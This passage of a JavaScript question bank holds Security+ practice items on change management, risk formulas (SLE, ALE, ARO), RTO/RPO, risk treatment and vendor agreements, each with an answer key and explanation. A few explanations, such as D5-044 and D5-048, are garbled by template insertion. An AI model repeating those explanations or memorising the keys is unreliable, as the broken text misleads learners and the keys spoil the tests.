{ id:"D5-018", domain:5, obj:"5.1", diff:"medium", q:"A change management policy MOST directly supports security by:", options:["Encrypting data in transit","Ensuring modifications are reviewed, approved, and documented before deployment","Calculating annualized loss expectancy","Defining recovery point objectives"], answer:1, explain:"A change management policy supports security by <strong>ensuring modifications are reviewed, approved, and documented before deployment</strong>, reducing unauthorized or destabilizing changes.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Encrypting data in transit</b>: that is a transport security control, not a function of governing how changes are approved.</span><span class='qd'><b>Calculating annualized loss expectancy</b>: ALE is a quantitative risk metric, unrelated to controlling the change process.</span><span class='qd'><b>Defining recovery point objectives</b>: an RPO is a business continuity target set by a BIA, not part of change governance.</span>" },
{ id:"D5-019", domain:5, obj:"5.1", diff:"medium", q:"Which statement BEST distinguishes a standard from a guideline?", options:["Both are advisory and non-binding","A standard is optional; a guideline is mandatory","A standard is mandatory; a guideline is recommended","Both are mandatory and interchangeable"], answer:2, explain:"A <strong>standard is mandatory; a guideline is recommended</strong>, which is the core distinction between the two document types.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>A standard is optional; a guideline is mandatory</b>: this reverses their roles, since standards are enforceable and guidelines are advisory.</span><span class='qd'><b>Both are mandatory and interchangeable</b>: only standards are mandatory, and the two serve different purposes, so they are not interchangeable.</span><span class='qd'><b>Both are advisory and non-binding</b>: standards are binding requirements, so describing both as advisory is incorrect.</span>" },
{ id:"D5-020", domain:5, obj:"5.1", diff:"hard", q:"An auditor finds the company has strong policies but no documented steps for executing them, leading to inconsistent results. The MOST appropriate corrective action is to develop:", options:["A new risk appetite","An external compliance report","Additional guidelines","Detailed procedures"], answer:3, explain:"When strong policies exist but execution is inconsistent for lack of documented steps, the fix is to develop <strong>detailed procedures</strong> that define exact, repeatable actions.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Additional guidelines</b>: guidelines are advisory and would not enforce consistent execution the way mandatory procedures do.</span><span class='qd'><b>A new risk appetite</b>: a risk appetite statement addresses how much risk to accept, not the missing operational steps.</span><span class='qd'><b>An external compliance report</b>: a compliance report documents status to outsiders and does nothing to standardize internal execution.</span>" },
{ id:"D5-021", domain:5, obj:"5.1", diff:"medium", q:"In data privacy law, the individual whose personal data is being collected and processed is the data:", options:["Subject","Steward","Custodian","Owner"], answer:0, explain:"The <strong>subject</strong> is the natural person to whom the personal data being collected and processed relates.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Steward</b>: a steward manages data quality and proper use, not the person the data is about.</span><span class='qd'><b>Custodian</b>: a custodian provides technical protection of data, not the individual the data describes.</span><span class='qd'><b>Owner</b>: a data owner is the accountable senior role over the data set, not the person whose data it is.</span>" },
{ id:"D5-022", domain:5, obj:"5.1", diff:"hard", q:"Two companies jointly decide the purposes and means of processing a shared customer database. Under GDPR concepts, they are MOST accurately described as:", options:["Owner and subject","Joint controllers","Co-processors","Custodian and steward"], answer:1, explain:"When two or more parties jointly determine the purposes and means of processing shared data, they are <strong>joint controllers</strong> under GDPR.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Co-processors</b>: processors only act on a controller's instructions, but here both parties decide purposes and means, making them controllers.</span><span class='qd'><b>Custodian and steward</b>: these are internal operational data-governance roles, not the GDPR legal designation for shared decision-making over processing.</span><span class='qd'><b>Owner and subject</b>: an owner-and-subject pairing mixes an accountable data role with the individual the data is about, which does not describe joint processing decisions.</span>" },
{ id:"D5-023", domain:5, obj:"5.1", diff:"easy", q:"Monitoring and oversight of a security program to confirm policies are followed is BEST described as:", options:["Asset valuation","Risk transfer","Governance and compliance oversight","Incident eradication"], answer:2, explain:"Ongoing <strong>governance and compliance oversight</strong> monitors a security program to confirm that policies and standards are being followed.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Risk transfer</b>: risk transfer shifts financial impact to a third party such as an insurer, not a monitoring activity.</span><span class='qd'><b>Incident eradication</b>: eradication is an incident response step that removes a threat, not continuous policy oversight.</span><span class='qd'><b>Asset valuation</b>: asset valuation assigns financial worth to assets for risk calculation, unrelated to verifying policy adherence.</span>" },
{ id:"D5-024", domain:5, obj:"5.1", diff:"medium", q:"Which external consideration is driven primarily by geographic location, such as differing breach-notification timelines between jurisdictions?", options:["Internal guidelines","Vendor SLAs","Industry standards","Local and national regulations"], answer:3, explain:"<strong>Local and national regulations</strong> are geography-driven external considerations that impose location-specific rules such as differing breach-notification timelines.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Industry standards</b>: industry standards apply across a sector regardless of location, not specifically by jurisdiction.</span><span class='qd'><b>Internal guidelines</b>: internal guidelines are self-authored advisory documents, not externally imposed geographic mandates.</span><span class='qd'><b>Vendor SLAs</b>: an SLA is a contractual performance commitment with a supplier, not a jurisdiction-driven legal requirement.</span>" },
{ id:"D5-025", domain:5, obj:"5.2", diff:"easy", q:"In quantitative risk analysis, the Single Loss Expectancy (SLE) is calculated as:", options:["Asset Value multiplied by Exposure Factor","Asset Value multiplied by Annualized Rate of Occurrence","SLE multiplied by ARO","Exposure Factor divided by Asset Value"], answer:0, explain:"Single Loss Expectancy is calculated as <strong>Asset Value multiplied by Exposure Factor</strong>, the expected loss from one occurrence of the threat.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Asset Value multiplied by Annualized Rate of Occurrence</b>: combining AV with ARO is not a valid formula, since ARO applies to annualized, not single-event, loss.</span><span class='qd'><b>SLE multiplied by ARO</b>: SLE x ARO computes the Annualized Loss Expectancy, not the SLE itself.</span><span class='qd'><b>Exposure Factor divided by Asset Value</b>: dividing EF by AV inverts the relationship and yields no meaningful loss figure.</span>" },
{ id:"D5-026", domain:5, obj:"5.2", diff:"easy", q:"The Annualized Loss Expectancy (ALE) is found by:", options:["AV x EF","SLE x ARO","SLE / ARO","ARO x EF"], answer:1, explain:"Annualized Loss Expectancy is found by <strong>SLE x ARO</strong>, giving the expected monetary loss per year.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>AV x EF</b>: that formula produces the Single Loss Expectancy for one event, not the annualized figure.</span><span class='qd'><b>SLE / ARO</b>: dividing SLE by ARO is not a valid risk formula and understates annual loss when events occur more than once.</span><span class='qd'><b>ARO x EF</b>: multiplying ARO by EF omits asset value entirely and does not yield a monetary loss.</span>" },
{ id:"D5-027", domain:5, obj:"5.2", diff:"medium", q:"An asset is valued at $200,000. A fire is expected to destroy 40% of its value. What is the SLE?", options:["$200,000","$40,000","$80,000","$120,000"], answer:2, explain:"SLE = AV x EF = $200,000 x 0.40 = <strong>$80,000</strong>, the expected loss from a single fire event.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>$40,000</b>: this would result from a 20% exposure factor, but the stated EF is 40%.</span><span class='qd'><b>$120,000</b>: $120,000 reflects the 60% of value that survives, not the 40% lost.</span><span class='qd'><b>$200,000</b>: $200,000 is the full asset value, which would imply total destruction rather than a 40% loss.</span>" },
{ id:"D5-028", domain:5, obj:"5.2", diff:"medium", q:"A server worth $50,000 has an exposure factor of 25% for a given threat, which is expected to occur twice per year. What is the ALE?", options:["$6,250","$50,000","$12,500","$25,000"], answer:3, explain:"SLE = $50,000 x 0.25 = $12,500, and ALE = SLE x ARO = $12,500 x 2 = <strong>$25,000</strong>.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>$12,500</b>: $12,500 is the SLE for a single occurrence and ignores that the threat happens twice per year.</span><span class='qd'><b>$6,250</b>: this halves the SLE instead of doubling it, applying the ARO incorrectly.</span><span class='qd'><b>$50,000</b>: $50,000 is the full asset value, not the annualized expected loss.</span>" },
{ id:"D5-029", domain:5, obj:"5.2", diff:"hard", q:"A risk has an SLE of $30,000 and an ALE of $90,000. What is the Annualized Rate of Occurrence (ARO)?", options:["3","30","0.33","1"], answer:0, explain:"ARO = ALE / SLE = $90,000 / $30,000 = <strong>3</strong> occurrences per year.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>0.33</b>: 0.33 inverts the division (SLE / ALE) instead of ALE / SLE.</span><span class='qd'><b>1</b>: an ARO of 1 would make ALE equal SLE, but here ALE is three times the SLE.</span><span class='qd'><b>30</b>: 30 misplaces the decimal, overstating the rate tenfold.</span>" },
{ id:"D5-030", domain:5, obj:"5.2", diff:"hard", q:"A laptop fleet is worth $400,000. Theft has an exposure factor of 10% and occurs about once every four years. What is the ALE?", options:["$40,000","$10,000","$4,000","$1,000"], answer:1, explain:"SLE = $400,000 x 0.10 = $40,000; ARO = 1/4 = 0.25; ALE = $40,000 x 0.25 = <strong>$10,000</strong>.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>$40,000</b>: $40,000 is the SLE for a single theft and ignores that it occurs only once every four years.</span><span class='qd'><b>$4,000</b>: this applies an ARO of 0.025 rather than 0.25, off by a factor of ten.</span><span class='qd'><b>$1,000</b>: $1,000 would require either a much smaller loss or rarer event than the figures given.</span>" },
{ id:"D5-031", domain:5, obj:"5.2", diff:"medium", q:"A control costs $8,000 per year and reduces a risk's ALE from $25,000 to $5,000. Based purely on cost-benefit, the organization should:", options:["Reject because residual risk remains","Reject the control because $8,000 is too high","Implement the control because it saves $12,000 net per year","Implement only if ARO is below 1"], answer:2, explain:"Annual benefit is $25,000 - $5,000 = $20,000, and net savings are $20,000 - $8,000 = $12,000, so the firm should <strong>implement the control because it saves $12,000 net per year</strong>.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Reject the control because $8,000 is too high</b>: the $8,000 cost is far below the $20,000 in risk reduction it delivers, so it is justified.</span><span class='qd'><b>Implement only if ARO is below 1</b>: the cost-benefit is already favorable regardless of ARO, which is embedded in the ALE figures.</span><span class='qd'><b>Reject because residual risk remains</b>: some residual risk almost always remains, and its presence does not negate a positive net benefit.</span>" },
{ id:"D5-032", domain:5, obj:"5.2", diff:"easy", q:"Which risk treatment strategy involves purchasing cyber insurance to shift financial impact to a third party?", options:["Mitigate","Accept","Avoid","Transfer"], answer:3, explain:"<strong>Transfer</strong> shifts the financial consequences of a risk to another party, commonly through cyber insurance or contracts.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Accept</b>: acceptance means retaining the risk and its costs, not shifting them to a third party.</span><span class='qd'><b>Avoid</b>: avoidance eliminates the risk by ceasing the activity, rather than offloading its financial impact.</span><span class='qd'><b>Mitigate</b>: mitigation reduces likelihood or impact with controls but keeps the residual financial exposure in-house.</span>" },
{ id:"D5-033", domain:5, obj:"5.2", diff:"easy", q:"Deciding to discontinue a risky business activity entirely is an example of risk:", options:["Avoidance","Transference","Mitigation","Acceptance"], answer:0, explain:"<strong>Avoidance</strong> eliminates a risk by discontinuing or not undertaking the activity that creates it.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Acceptance</b>: acceptance keeps the activity and its risk, rather than discontinuing it.</span><span class='qd'><b>Transference</b>: transference moves the financial impact to a third party while the activity continues.</span><span class='qd'><b>Mitigation</b>: mitigation reduces the risk of an ongoing activity with controls rather than stopping it entirely.</span>" },
{ id:"D5-034", domain:5, obj:"5.2", diff:"easy", q:"Applying additional controls to reduce the likelihood or impact of a risk is known as risk:", options:["Avoidance","Mitigation","Transference","Acceptance"], answer:1, explain:"<strong>Mitigation</strong> applies additional controls to reduce the likelihood or impact of a risk.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Acceptance</b>: acceptance takes no action and simply retains the risk as-is.</span><span class='qd'><b>Avoidance</b>: avoidance removes the risk by stopping the activity, not by adding controls to it.</span><span class='qd'><b>Transference</b>: transference shifts financial impact to another party rather than reducing likelihood or impact directly.</span>" },
{ id:"D5-035", domain:5, obj:"5.2", diff:"medium", q:"After applying all cost-effective controls, management formally signs off on the remaining low-level risk. This is risk:", options:["Transference","Mitigation","Acceptance","Avoidance"], answer:2, explain:"<strong>Acceptance</strong> is the formal, documented decision to live with residual risk that falls within the organization's appetite after cost-effective controls are applied.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Avoidance</b>: avoidance would mean ceasing the activity, but here management chooses to retain the remaining risk.</span><span class='qd'><b>Transference</b>: transference shifts the residual risk to a third party rather than signing off to retain it.</span><span class='qd'><b>Mitigation</b>: mitigation adds further controls, whereas the scenario describes accepting what remains after controls are already in place.</span>" },
{ id:"D5-036", domain:5, obj:"5.2", diff:"medium", q:"Which document serves as a living repository that tracks identified risks, their owners, scores, and treatment status?", options:["Acceptable use policy","Disaster recovery plan","Business impact analysis","Risk register"], answer:3, explain:"A <strong>risk register</strong> is a living repository that tracks identified risks along with their owners, scores, and treatment status.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Business impact analysis</b>: a BIA identifies critical processes and disruption impacts to set recovery objectives, not an ongoing catalog of risk treatments.</span><span class='qd'><b>Acceptable use policy</b>: an AUP governs how employees may use systems, unrelated to tracking risks.</span><span class='qd'><b>Disaster recovery plan</b>: a DR plan documents how to restore operations after a disruption, not a register of risk scores and owners.</span>" },
{ id:"D5-037", domain:5, obj:"5.2", diff:"medium", q:"A risk assessment that uses descriptive ratings like 'low, medium, high' rather than dollar figures is:", options:["Qualitative","Annualized","Actuarial","Quantitative"], answer:0, explain:"A <strong>qualitative</strong> assessment ranks risk using descriptive ratings like low, medium, and high rather than dollar figures.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Quantitative</b>: quantitative analysis assigns precise monetary values, the opposite of descriptive ratings.</span><span class='qd'><b>Annualized</b>: annualized refers to expressing loss per year (as in ALE), not to a category of rating scale.</span><span class='qd'><b>Actuarial</b>: actuarial analysis applies statistical probability to numerical loss data, which is a quantitative approach.</span>" },
{ id:"D5-038", domain:5, obj:"5.2", diff:"medium", q:"Which assessment type expresses risk in concrete monetary terms using values such as SLE and ALE?", options:["Qualitative","Quantitative","Heuristic","Subjective"], answer:1, explain:"A <strong>quantitative</strong> assessment expresses risk in concrete monetary terms using values such as SLE and ALE.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Qualitative</b>: qualitative analysis uses subjective categories like high or low, not numeric monetary values.</span><span class='qd'><b>Heuristic</b>: a heuristic is a rule-of-thumb shortcut, not a formal monetary risk measurement method.</span><span class='qd'><b>Subjective</b>: subjective judgment is characteristic of qualitative ratings, not the dollar-based calculations described.</span>" },
{ id:"D5-039", domain:5, obj:"5.2", diff:"hard", q:"A board wants risk results that support precise cost-benefit budgeting but acknowledges some inputs are hard to measure objectively. The BEST approach is usually to:", options:["Use only ALE figures with no context","Use purely qualitative ratings","Combine qualitative and quantitative methods (hybrid)","Skip assessment and rely on insurance"], answer:2, explain:"A <strong>combine qualitative and quantitative methods (hybrid)</strong> approach pairs monetary figures with judgment, balancing objectivity against inputs that are hard to measure.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Use purely qualitative ratings</b>: pure qualitative ratings lack the dollar figures the board needs for precise cost-benefit budgeting.</span><span class='qd'><b>Skip assessment and rely on insurance</b>: relying solely on insurance transfers risk without analyzing it and ignores the board's budgeting need.</span><span class='qd'><b>Use only ALE figures with no context</b>: ALE alone, without qualitative context, ignores the inputs the board concedes are hard to measure objectively.</span>" },
{ id:"D5-040", domain:5, obj:"5.2", diff:"medium", q:"The maximum acceptable amount of time a business process can be down before unacceptable consequences occur is the:", options:["Mean Time To Repair (MTTR)","Mean Time Between Failures (MTBF)","Recovery Point Objective (RPO)","Recovery Time Objective (RTO)"], answer:3, explain:"The <strong>Recovery Time Objective (RTO)</strong> is the maximum acceptable time a process can be down before consequences become unacceptable.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Recovery Point Objective (RPO)</b>: an RPO measures acceptable data loss in time, not the allowable downtime duration.</span><span class='qd'><b>Mean Time To Repair (MTTR)</b>: MTTR is the average time to fix a failed component, a reliability metric rather than a business-driven downtime limit.</span><span class='qd'><b>Mean Time Between Failures (MTBF)</b>: MTBF measures average uptime between failures, not the tolerable outage length.</span>" },
{ id:"D5-041", domain:5, obj:"5.2", diff:"medium", q:"The maximum acceptable amount of data loss measured in time, which drives backup frequency, is the:", options:["RPO","MTTR","MTBF","RTO"], answer:0, explain:"The <strong>RPO</strong> is the maximum acceptable amount of data loss measured in time, which dictates how often backups must run.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>RTO</b>: the RTO defines acceptable downtime to restore a process, not the acceptable quantity of lost data.</span><span class='qd'><b>MTTR</b>: MTTR is the average repair time for a failed component, unrelated to backup frequency.</span><span class='qd'><b>MTBF</b>: MTBF measures average time between failures, a reliability metric, not a data-loss tolerance.</span>" },
{ id:"D5-042", domain:5, obj:"5.2", diff:"hard", q:"A database is backed up every 6 hours and has an RPO of 4 hours. The current backup schedule MOST likely:", options:["Meets the RPO comfortably","Fails to meet the RPO and needs more frequent backups","Only affects RTO, not RPO","Eliminates the need for an RTO"], answer:1, explain:"Because 6-hour backups can lose up to 6 hours of data, the schedule <strong>fails to meet the RPO and needs more frequent backups</strong> to stay within the 4-hour limit.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Meets the RPO comfortably</b>: a 6-hour gap exceeds the 4-hour RPO, so it does not meet it.</span><span class='qd'><b>Only affects RTO, not RPO</b>: backup frequency directly governs potential data loss, which is the RPO, not the RTO.</span><span class='qd'><b>Eliminates the need for an RTO</b>: backup frequency and the RTO are separate objectives, and one never removes the need for the other.</span>" },
{ id:"D5-043", domain:5, obj:"5.2", diff:"medium", q:"Which metric represents the average time required to restore a failed component to operation?", options:["ARO","MTBF","MTTR","RPO"], answer:2, explain:"<strong>MTTR</strong> (Mean Time To Repair) is the average time required to restore a failed component to operation.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>MTBF</b>: MTBF measures the average interval between failures, indicating reliability, not repair time.</span><span class='qd'><b>RPO</b>: an RPO is the acceptable amount of data loss in time, not a repair-time metric.</span><span class='qd'><b>ARO</b>: ARO is the annualized rate of occurrence of a threat, used in risk math, not a measure of restoration time.</span>" },
{ id:"D5-044", domain:5, obj:"5.2", diff:"medium", q:"A high Mean Time Between Failures (MTBF) value indicates that a component is:", options:["Quick to repair after failure","Expensive to replace","Failing very frequently","Reliable, with long intervals between failures"], answer:3, explain:"A high <strong>reliable, with long intervals between failures</strong> value means the component runs longer on average before failing, indicating greater reliability.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Failing very frequently</b>: frequent failure would produce a low MTBF, not a high one.</span><span class='qd'><b>Quick to repair after failure</b>: repair speed is measured by MTTR, not by the time between failures.</span><span class='qd'><b>Expensive to replace</b>: cost of replacement is unrelated to MTBF, which measures failure intervals.</span>" },
{ id:"D5-045", domain:5, obj:"5.2", diff:"hard", q:"A critical application has an RTO of 1 hour, but the documented recovery procedure consistently takes 4 hours to complete. The FIRST priority should be to:", options:["Improve recovery capabilities to meet the 1-hour RTO or formally revise the objective with management","Increase backup frequency to fix the RTO","Transfer the risk through insurance","Lower the RTO to match the 4-hour reality"], answer:0, explain:"Because the RTO is business-driven, the first priority is to <strong>improve recovery capabilities to meet the 1-hour RTO or formally revise the objective with management</strong>.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Lower the RTO to match the 4-hour reality</b>: unilaterally lowering the objective to fit current performance abandons the business requirement without management approval.</span><span class='qd'><b>Increase backup frequency to fix the RTO</b>: backup frequency governs the RPO (data loss), not the time needed to restore service.</span><span class='qd'><b>Transfer the risk through insurance</b>: insurance offsets financial loss but does not shorten recovery time to meet the RTO.</span>" },
{ id:"D5-046", domain:5, obj:"5.2", diff:"hard", q:"An assessment performed at fixed annual intervals as part of a compliance cycle, rather than continuously, is BEST described as a:", options:["Continuous assessment","Recurring (ad hoc vs scheduled) assessment","One-time assessment","Third-party-only assessment"], answer:1, explain:"An assessment conducted at fixed annual intervals is a <strong>recurring (ad hoc vs scheduled) assessment</strong>, performed on a defined schedule.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Continuous assessment</b>: continuous assessment runs constantly rather than at fixed annual points.</span><span class='qd'><b>One-time assessment</b>: a one-time assessment happens once, not on a repeating annual cycle.</span><span class='qd'><b>Third-party-only assessment</b>: who performs the assessment (a third party) is a different attribute from how often it recurs.</span>" },
{ id:"D5-047", domain:5, obj:"5.2", diff:"medium", q:"A Business Impact Analysis (BIA) is primarily used to:", options:["Define acceptable use of email","Encrypt sensitive data at rest","Identify critical processes and the impact of their disruption to set RTO and RPO","List approved software for endpoints"], answer:2, explain:"A <strong>Business Impact Analysis</strong> identifies critical processes and the impact of their disruption to set recovery objectives like RTO and RPO.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Encrypt sensitive data at rest</b>: encryption is a confidentiality control, not the purpose of analyzing business disruption impact.</span><span class='qd'><b>List approved software for endpoints</b>: maintaining an approved-software list is an application-control task, unrelated to impact analysis.</span><span class='qd'><b>Define acceptable use of email</b>: acceptable email use is governed by an AUP, not by a BIA.</span>" },
{ id:"D5-048", domain:5, obj:"5.2", diff:"hard", q:"An organization's risk tolerance differs from its risk appetite in that tolerance is:", options:["Identical to appetite with no practical difference","Always set higher than appetite by regulation","The broad strategic level of risk pursued, while appetite is the specific allowable deviation","The acceptable variation around a specific risk objective, while appetite is the overall strategic level"], answer:3, explain:"Risk <strong>the acceptable variation around a specific risk objective, while appetite is the overall strategic level</strong> tolerance captures allowable deviation around a target, distinct from the broad strategic appetite.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>The broad strategic level of risk pursued, while appetite is the specific allowable deviation</b>: this reverses the definitions, since appetite is the broad level and tolerance is the deviation.</span><span class='qd'><b>Identical to appetite with no practical difference</b>: tolerance and appetite are distinct concepts operating at different levels of specificity.</span><span class='qd'><b>Always set higher than appetite by regulation</b>: there is no regulatory rule forcing tolerance above appetite, and tolerance bounds variation around objectives.</span>" },
{ id:"D5-049", domain:5, obj:"5.2", diff:"hard", q:"A company calculates an ALE of $120,000 for ransomware. A backup-and-recovery control costing $90,000 annually would cut the ALE to $20,000. The MOST defensible decision is to:", options:["Implement the control; net annual savings are about $10,000","Transfer the entire risk via insurance instead","Accept the risk without any control","Reject the control; it costs more than the residual risk"], answer:0, explain:"Risk reduction is $120,000 - $20,000 = $100,000 and net benefit is $100,000 - $90,000 = $10,000, so the firm should <strong>implement the control; net annual savings are about $10,000</strong>.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Reject the control; it costs more than the residual risk</b>: the relevant comparison is cost versus risk reduction ($100,000), not cost versus the $20,000 residual, and the control yields a positive net benefit.</span><span class='qd'><b>Transfer the entire risk via insurance instead</b>: nothing shows insurance is cheaper or more effective, and this control already produces a net saving.</span><span class='qd'><b>Accept the risk without any control</b>: accepting the full $120,000 ALE forgoes a control that demonstrably saves money.</span>" },
{ id:"D5-050", domain:5, obj:"5.2", diff:"medium", q:"Which of the following BEST describes residual risk?", options:["Risk that exists before any controls are applied","Risk remaining after controls and treatments have been applied","Risk transferred entirely to an insurer","Risk that has zero probability of occurring"], answer:1, explain:"<strong>Risk remaining after controls and treatments have been applied</strong> is the definition of residual risk.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Risk that exists before any controls are applied</b>: that describes inherent risk, which exists prior to treatment, not after.</span><span class='qd'><b>Risk transferred entirely to an insurer</b>: transferred risk is shifted to a third party, whereas residual risk is what the organization still retains.</span><span class='qd'><b>Risk that has zero probability of occurring</b>: residual risk still carries some probability; zero-probability risk is effectively no risk at all.</span>" }
);
SECPLUS.questions.push(
  { id:"D5-051", domain:5, obj:"5.3", diff:"easy", q:"Which agreement defines the specific performance metrics, uptime guarantees, and response times a vendor must meet?", options:["SOW","MOU","SLA","NDA"], answer:2, explain:"A <strong>SLA</strong> specifies measurable performance commitments such as uptime guarantees, availability, and response times a vendor must meet.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>MOU</b>: a Memorandum of Understanding expresses non-binding mutual intent, not enforceable performance metrics.</span><span class='qd'><b>NDA</b>: a Non-Disclosure Agreement protects confidential information, not service performance levels.</span><span class='qd'><b>SOW</b>: a Statement of Work lists deliverables and tasks for a project, not ongoing uptime and response guarantees.</span>" },
  { id:"D5-052", domain:5, obj:"5.3", diff:"easy", q:"Which document is a legally binding contract used to protect confidential information shared between two parties?", options:["BPA","SLA","MOA","NDA"], answer:3, explain:"An <strong>NDA</strong> is a legally binding contract that obligates parties to keep shared confidential information secret.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>BPA</b>: a Business Partners Agreement defines the partnership relationship and profit sharing, not confidentiality protection specifically.</span><span class='qd'><b>SLA</b>: an SLA sets performance metrics, not obligations to protect confidential information.</span><span class='qd'><b>MOA</b>: a Memorandum of Agreement defines agreed responsibilities, not the focused secrecy obligation of an NDA.</span>" },
  { id:"D5-053", domain:5, obj:"5.3", diff:"medium", q:"A company and a supplier want to document the overall master terms governing all future contracts between them. Which agreement establishes that foundation?", options:["MSA","NDA","SOW","SLA"], answer:0, explain:"A <strong>MSA</strong> establishes the overarching master terms and conditions governing all future contracts between the parties.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>SOW</b>: a SOW defines a specific project's deliverables under a master agreement, not the foundational master terms.</span><span class='qd'><b>SLA</b>: an SLA sets performance metrics for a service, not the broad contractual foundation for all engagements.</span><span class='qd'><b>NDA</b>: an NDA addresses confidentiality only, not the full master terms for the business relationship.</span>" },
  { id:"D5-054", domain:5, obj:"5.3", diff:"easy", q:"Which document lists the specific deliverables, timelines, and tasks for a particular project under a broader contract?", options:["NDA","SOW","MOU","BPA"], answer:1, explain:"A <strong>SOW</strong> details the specific deliverables, timelines, and tasks for a particular project under a broader contract.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>MOU</b>: an MOU records non-binding mutual intent, not concrete project deliverables and milestones.</span><span class='qd'><b>BPA</b>: a BPA defines a partnership relationship and profit sharing, not project-level tasks.</span><span class='qd'><b>NDA</b>: an NDA protects confidential information and does not enumerate deliverables or timelines.</span>" },
  { id:"D5-055", domain:5, obj:"5.3", diff:"medium", q:"Two organizations sign a non-binding document expressing their shared intentions to collaborate before a formal contract is drafted. What is this called?", options:["MSA","SLA","MOU","BPA"], answer:2, explain:"An <strong>MOU</strong> is a non-binding document expressing shared intentions to collaborate before a formal contract is drafted.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>MSA</b>: an MSA is a binding master contract setting enforceable terms, not a non-binding statement of intent.</span><span class='qd'><b>SLA</b>: an SLA is a binding agreement on measurable performance levels, not an expression of preliminary intent.</span><span class='qd'><b>BPA</b>: a BPA is a binding agreement governing a business partnership, not a non-committal memorandum.</span>" },
  { id:"D5-056", domain:5, obj:"5.3", diff:"medium", q:"Which agreement is most associated with defining the terms under which two business partners share profits and responsibilities in a venture?", options:["NDA","SOW","SLA","BPA"], answer:3, explain:"A <strong>BPA</strong> defines the relationship, contributions, and profit-sharing between business partners in a venture.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>NDA</b>: an NDA protects confidential information and does not govern how partners share profits and responsibilities.</span><span class='qd'><b>SOW</b>: a SOW specifies project deliverables, not the terms of a partnership.</span><span class='qd'><b>SLA</b>: an SLA defines service performance metrics, not the division of profits between partners.</span>" },
  { id:"D5-057", domain:5, obj:"5.3", diff:"hard", q:"An MOU between agencies needs to become a more formal, often legally enforceable, statement of agreed responsibilities. Which document BEST represents that next step?", options:["MOA","SOW","BPA","SLA"], answer:0, explain:"A <strong>MOA</strong> is more formal than an MOU and typically defines the specific, often legally enforceable, responsibilities each party will perform.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>SLA</b>: an SLA focuses on measurable service performance levels, not on formalizing agreed responsibilities between agencies.</span><span class='qd'><b>SOW</b>: a SOW details project deliverables and tasks, not the broader statement of mutual responsibilities.</span><span class='qd'><b>BPA</b>: a BPA governs a business partnership with profit sharing, which does not fit two agencies formalizing duties.</span>" },
  { id:"D5-058", domain:5, obj:"5.3", diff:"medium", q:"Which contractual clause gives an organization the legal authority to inspect a vendor's security controls and records?", options:["Termination clause","Right-to-audit clause","Indemnification clause","Force majeure clause"], answer:1, explain:"A <strong>right-to-audit clause</strong> grants the organization legal authority to inspect a vendor's security controls, records, and compliance.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Indemnification clause</b>: indemnification allocates liability for losses, not the authority to inspect controls.</span><span class='qd'><b>Force majeure clause</b>: force majeure excuses performance during extraordinary events, unrelated to audit rights.</span><span class='qd'><b>Termination clause</b>: a termination clause defines how the contract may be ended, not the right to examine security.</span>" },
  { id:"D5-059", domain:5, obj:"5.3", diff:"medium", q:"During vendor selection, an organization reviews a potential supplier's financial stability, security posture, and reputation. This process is BEST described as what?", options:["Penetration testing","Right to be forgotten","Due diligence","Conflict of interest review"], answer:2, explain:"Reviewing a supplier's financial stability, security posture, and reputation before engagement is vendor <strong>due diligence</strong>.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Conflict of interest review</b>: a conflict-of-interest review checks for competing loyalties, not overall supplier suitability.</span><span class='qd'><b>Penetration testing</b>: a penetration test actively probes systems for vulnerabilities, not a holistic vendor evaluation.</span><span class='qd'><b>Right to be forgotten</b>: the right to be forgotten is a GDPR data-erasure right, unrelated to assessing a vendor.</span>" },
